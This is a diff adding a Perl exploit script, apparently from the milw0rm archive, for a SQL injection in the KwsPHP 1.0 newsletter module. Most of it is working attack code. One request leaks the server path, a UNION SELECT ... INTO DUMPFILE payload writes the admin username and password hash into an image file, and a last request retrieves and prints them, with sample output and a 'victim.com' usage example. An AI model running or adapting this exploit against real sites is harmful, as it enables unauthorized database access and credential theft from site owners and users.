@@ -1,0 +1,195 @@
+##################################################
+#	Script....................................: KwsPHP  ver 1.0 Newsletter Module
+#	Script Site...........................: http://www.kwsphp.org
+#	Vulnerability........................: Remote SQL injection Exploit
+#	Access..................................: Remote
+#	level......................................: Dangerous
+#	Author..................................: S4mi 
+#	Contact.................................: S4mi[at]LinuxMail.org 
+##################################################
+#Special Greetz to : Simo64, DrackaNz, Coder212, Iss4m, HarDose, r0_0t, ddx39 .....
+#
+##################################################
+#This Exploit Only When magic_quotes_gpc Is OFF
+#Vuln Files:
+#\modules\newsletter\index.php
+#               [code]
+#
+# line: 94	$req = reqmysql('SELECT pseudo,email FROM users WHERE email="'.$newsletter.'"') ;
+# line: 95	$rep1 = mysql_fetch_object($req) ;
+#                
+#                  [/code]
+#
+#**************************************************************************
+
+#Screen shot
+#----------------
+#C:\>KwsPHP.pl 127.0.0.1 /KwsPHP/
+
+# Connecting .....[OK]
+# Sending Data ...[OK]
+
+#+ Getting the Full path.
+#+ ---------------- +
+#+ path: c:\public_html\kwsphp\
+
+# Connecting .....[OK]
+# Sending Data ...[OK]
+
+#+ Getting the injected code.
+#+ ---------------- +
+#127.0.0.1/KwsPHP//index.php?mod=newsletter&avert_news=1&newsletter="union all select pseudo,concat(CHAR(58),CHAR(58),pass,CHAR(44)) from users where id=1 INTO DUMPFILE 'c:/public_html/kwsphp/images/l3eez.gif'/*
+#+ ---------------- +
+
+#+ injecting database.
+#+ ---------------- +
+#+ Done!
+
+# Connecting .....[OK]
+# Sending Data ...[OK]
+
+#+ Getting user info.
+#+ ---------------- +
+#+ username: admin1
+#+ Password: e10adc3949ba59abbe56e057f20f883e
+
+#C:\>
+
+###################################################
+
+#!/usr/bin/perl
+
+use IO::Socket ;
+
+&header();
+
+&usage unless(defined($ARGV[0] && $ARGV[1] ));
+
+$host = $ARGV[0];
+$path = $ARGV[1];
+
+#print "User Name: ";
+#$user = <STDIN>;
+#chop ($user);
+
+syswrite STDOUT ,"\n Connecting ...";
+
+my $sock = new IO::Socket::INET ( PeerAddr => "$host",PeerPort => "80",Proto => "tcp",);
+								
+die "\n Unable to connect to $host\n" unless($sock);
+
+syswrite STDOUT, "[OK]";
+
+syswrite STDOUT ,"\n Sending Data ...";
+
+print $sock "GET $path/index.php?mod=newsletter&avert_news=1&newsletter=\" HTTP/1.1\n";
+print $sock "Host: $host\n";
+print $sock "Referer: $host\n";
+print $sock "Accept-Language: en-us\n";
+print $sock "Content-Type: application/x-www-form-urlencoded\n";
+print $sock "User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n";
+print $sock "Cache-Control: no-cache\n";
+print $sock "Connection: Close\n\n";
+syswrite STDOUT ,"[OK]\n\n";
+
+while($answer = <$sock>){
+
+if ($answer =~ /in <b>(.*?)\modul(.*?)92/){
+print "+ Getting the Full path.\n";
+print "+ ---------------- +\n";
+print "+ path: $1\n";
+
+# here we need to replace the  "\" by "/"  in the  $1 for the Windoz Servers (didn't 
+$localpath = $1;
+$fullpath = $localpath."images/l3eez.gif";
+}
+
+else
+{
+	print "\Can't find the full path\n";
+	exit(0);
+}
+}
+
+$inject = "union all select pseudo,concat(CHAR(58),CHAR(58),pass,CHAR(44)) from users where id=1 INTO DUMPFILE '$fullpath'/*";
+
+syswrite STDOUT ,"\n Connecting ...";
+
+my $sock = new IO::Socket::INET ( PeerAddr => "$host",PeerPort => "80",Proto => "tcp",);
+								
+die "\n Unable to connect to $host\n" unless($sock);
+
+syswrite STDOUT, "[OK]";
+
+syswrite STDOUT ,"\n Sending Data ...";
+print $sock "GET $path/index.php?mod=newsletter&avert_news=1&newsletter=\"$inject HTTP/1.1\n";
+print $sock "Host: $host\n";
+print $sock "Referer: $host\n";
+print $sock "Accept-Language: en-us\n";
+print $sock "Content-Type: application/x-www-form-urlencoded\n";
+print $sock "User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n";
+print $sock "Cache-Control: no-cache\n";
+print $sock "Connection: Close\n\n";
+syswrite STDOUT ,"[OK]\n\n";
+
+
+print "+ Getting the injected code.\n";
+print "+ ---------------- +\n";
+print "$host$path/index.php?mod=newsletter&avert_news=1&newsletter=\"$inject \n";
+print "+ ---------------- +\n\n";
+print "+ injecting database.\n";
+print "+ ---------------- +\n";
+
+
+#here need to connect to the new created file created from the sql injection (user::password,)
+syswrite STDOUT ,"\n Connecting ...";
+
+my $sock = new IO::Socket::INET ( PeerAddr => "$host",PeerPort => "80",Proto => "tcp",);
+								
+die "\n Unable to connect to $host\n" unless($sock);
+
+syswrite STDOUT, "[OK]";
+
+syswrite STDOUT ,"\n Sending Data ...";
+
+print $sock "GET $path/images/l3eez.gif HTTP/1.1\n";
+print $sock "Host: $host\n";
+print $sock "Referer: $host\n";
+print $sock "Accept-Language: en-us\n";
+print $sock "Content-Type: application/x-www-form-urlencoded\n";
+print $sock "User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n";
+print $sock "Cache-Control: no-cache\n";
+print $sock "Connection: Close\n\n";
+syswrite STDOUT ,"[OK]\n\n";
+
+
+while($answer = <$sock>){
+
+if ($answer =~ /(.*?)::(.*?),/){
+print "+ Getting user info.\n";
+print "+ ---------------- +\n";
+print "+ username: $1\n";
+print "+ Password: $2\n";
+}
+}
+
+sub usage{
+	print "\nUsage   : perl $0 host /path/ ";
+	print "\nExemple : perl $0 www.victim.com /KwsPHP/\n";
+	exit(0);
+}
+sub header(){
+print q(
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#	Script......................: KwsPHP  ver 1.0 Newsletter Module
+#	Script Site.................: http://www.kwsphp.org
+#	Vulnerability...............: Remote SQL injection Exploit
+#	Access......................: Remote
+#	level.......................: Dangerous
+#	Author......................: S4mi 
+#	Contact.....................: S4mi[at]LinuxMail.org 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+);
+}
+
+# milw0rm.com [2007-10-11]
